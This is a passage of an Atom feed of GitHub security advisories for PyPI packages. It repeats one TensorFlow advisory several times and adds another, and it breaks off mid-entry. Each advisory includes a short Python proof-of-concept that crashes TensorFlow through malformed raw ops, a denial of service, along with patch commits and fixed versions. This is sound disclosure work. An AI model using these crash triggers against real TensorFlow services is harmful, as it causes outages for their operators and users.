<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2022-09-19T07:15:44.179Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] TensorFlow vulnerable to `CHECK` fail in `Save` and `SaveSlices`]]></title>
        <id>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</id>
        <link href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4"/>
        <updated>2022-09-16T22:31:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If <code>Save</code> or <code>SaveSlices</code> is run over tensors of an unsupported <code>dtype</code>, it results in a <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
filename = tf.constant("")
tensor_names = tf.constant("")
# Save
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)
tf.raw_ops.Save(filename=filename, tensor_names=tensor_names, data=data, )
# SaveSlices
shapes_and_slices = tf.constant("")
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)
tf.raw_ops.SaveSlices(filename=filename, tensor_names=tensor_names, shapes_and_slices=shapes_and_slices, data=data, )
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/advisories/GHSA-m6vp-8q9j-whx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] TensorFlow vulnerable to `CHECK` fail in `Save` and `SaveSlices`]]></title>
        <id>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</id>
        <link href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4"/>
        <updated>2022-09-16T22:31:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If <code>Save</code> or <code>SaveSlices</code> is run over tensors of an unsupported <code>dtype</code>, it results in a <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
filename = tf.constant("")
tensor_names = tf.constant("")
# Save
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)
tf.raw_ops.Save(filename=filename, tensor_names=tensor_names, data=data, )
# SaveSlices
shapes_and_slices = tf.constant("")
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)
tf.raw_ops.SaveSlices(filename=filename, tensor_names=tensor_names, shapes_and_slices=shapes_and_slices, data=data, )
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/advisories/GHSA-m6vp-8q9j-whx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] TensorFlow vulnerable to `CHECK` fail in `Save` and `SaveSlices`]]></title>
        <id>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</id>
        <link href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4"/>
        <updated>2022-09-16T22:31:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If <code>Save</code> or <code>SaveSlices</code> is run over tensors of an unsupported <code>dtype</code>, it results in a <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
filename = tf.constant("")
tensor_names = tf.constant("")
# Save
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)
tf.raw_ops.Save(filename=filename, tensor_names=tensor_names, data=data, )
# SaveSlices
shapes_and_slices = tf.constant("")
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)
tf.raw_ops.SaveSlices(filename=filename, tensor_names=tensor_names, shapes_and_slices=shapes_and_slices, data=data, )
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/advisories/GHSA-m6vp-8q9j-whx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] TensorFlow vulnerable to `CHECK` fail in `Save` and `SaveSlices`]]></title>
        <id>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</id>
        <link href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4"/>
        <updated>2022-09-16T22:31:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If <code>Save</code> or <code>SaveSlices</code> is run over tensors of an unsupported <code>dtype</code>, it results in a <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
filename = tf.constant("")
tensor_names = tf.constant("")
# Save
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)
tf.raw_ops.Save(filename=filename, tensor_names=tensor_names, data=data, )
# SaveSlices
shapes_and_slices = tf.constant("")
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)
tf.raw_ops.SaveSlices(filename=filename, tensor_names=tensor_names, shapes_and_slices=shapes_and_slices, data=data, )
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/advisories/GHSA-m6vp-8q9j-whx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] TensorFlow vulnerable to `CHECK` fail in `Save` and `SaveSlices`]]></title>
        <id>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</id>
        <link href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4"/>
        <updated>2022-09-16T22:31:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If <code>Save</code> or <code>SaveSlices</code> is run over tensors of an unsupported <code>dtype</code>, it results in a <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
filename = tf.constant("")
tensor_names = tf.constant("")
# Save
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)
tf.raw_ops.Save(filename=filename, tensor_names=tensor_names, data=data, )
# SaveSlices
shapes_and_slices = tf.constant("")
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)
tf.raw_ops.SaveSlices(filename=filename, tensor_names=tensor_names, shapes_and_slices=shapes_and_slices, data=data, )
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/advisories/GHSA-m6vp-8q9j-whx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] TensorFlow vulnerable to `CHECK` fail in `Save` and `SaveSlices`]]></title>
        <id>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</id>
        <link href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4"/>
        <updated>2022-09-16T22:31:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If <code>Save</code> or <code>SaveSlices</code> is run over tensors of an unsupported <code>dtype</code>, it results in a <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
filename = tf.constant("")
tensor_names = tf.constant("")
# Save
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)
tf.raw_ops.Save(filename=filename, tensor_names=tensor_names, data=data, )
# SaveSlices
shapes_and_slices = tf.constant("")
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)
tf.raw_ops.SaveSlices(filename=filename, tensor_names=tensor_names, shapes_and_slices=shapes_and_slices, data=data, )
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/advisories/GHSA-m6vp-8q9j-whx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] TensorFlow vulnerable to `CHECK` fail in `Save` and `SaveSlices`]]></title>
        <id>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</id>
        <link href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4"/>
        <updated>2022-09-16T22:31:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If <code>Save</code> or <code>SaveSlices</code> is run over tensors of an unsupported <code>dtype</code>, it results in a <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
filename = tf.constant("")
tensor_names = tf.constant("")
# Save
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)
tf.raw_ops.Save(filename=filename, tensor_names=tensor_names, data=data, )
# SaveSlices
shapes_and_slices = tf.constant("")
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)
tf.raw_ops.SaveSlices(filename=filename, tensor_names=tensor_names, shapes_and_slices=shapes_and_slices, data=data, )
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/advisories/GHSA-m6vp-8q9j-whx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] TensorFlow vulnerable to `CHECK` fail in `Save` and `SaveSlices`]]></title>
        <id>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</id>
        <link href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4"/>
        <updated>2022-09-16T22:31:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If <code>Save</code> or <code>SaveSlices</code> is run over tensors of an unsupported <code>dtype</code>, it results in a <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
filename = tf.constant("")
tensor_names = tf.constant("")
# Save
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)
tf.raw_ops.Save(filename=filename, tensor_names=tensor_names, data=data, )
# SaveSlices
shapes_and_slices = tf.constant("")
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)
tf.raw_ops.SaveSlices(filename=filename, tensor_names=tensor_names, shapes_and_slices=shapes_and_slices, data=data, )
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/advisories/GHSA-m6vp-8q9j-whx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] TensorFlow vulnerable to `CHECK` fail in `Save` and `SaveSlices`]]></title>
        <id>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</id>
        <link href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4"/>
        <updated>2022-09-16T22:31:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If <code>Save</code> or <code>SaveSlices</code> is run over tensors of an unsupported <code>dtype</code>, it results in a <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
filename = tf.constant("")
tensor_names = tf.constant("")
# Save
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)
tf.raw_ops.Save(filename=filename, tensor_names=tensor_names, data=data, )
# SaveSlices
shapes_and_slices = tf.constant("")
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)
tf.raw_ops.SaveSlices(filename=filename, tensor_names=tensor_names, shapes_and_slices=shapes_and_slices, data=data, )
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4">https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-m6vp-8q9j-whx4">https://github.com/advisories/GHSA-m6vp-8q9j-whx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m6vp-8q9j-whx4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] TensorFlow vulnerable to `CHECK` fail in `ParameterizedTruncatedNormal`]]></title>
        <id>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</id>
        <link href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5"/>
        <updated>2022-09-16T22:30:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>ParameterizedTruncatedNormal</code> assumes <code>shape</code> is of type <code>int32</code>. A valid <code>shape</code> of type <code>int64</code> results in a mismatched type <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
seed = 1618
seed2 = 0
shape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)
means = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
stdevs = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
minvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
maxvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
tf.raw_ops.ParameterizedTruncatedNormal(shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals, seed=seed, seed2=seed2)
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">72180be03447a10810edca700cbc9af690dfeb51</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
